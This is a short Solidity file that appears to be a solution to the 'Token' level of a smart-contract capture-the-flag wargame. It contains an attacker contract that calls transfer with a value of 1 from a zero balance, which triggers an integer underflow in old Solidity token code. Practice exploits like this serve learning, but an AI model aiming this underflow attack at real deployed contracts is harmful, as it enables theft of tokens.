// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 5. TOKEN
 * @dev Get more tokens. Preferably a very large amount.
 */
interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}

// Solidity versions below 0.8.0 are vulnerable to underflow/overflow attacks.
contract UnsafeMath {
    address immutable token;

    constructor(address _token) {
        token = _token;
    }

    // This will transfer 1 tokens and trigger an underflow attack.
    function attack() public {
        IToken(token).transfer(msg.sender, 1);
    }
}
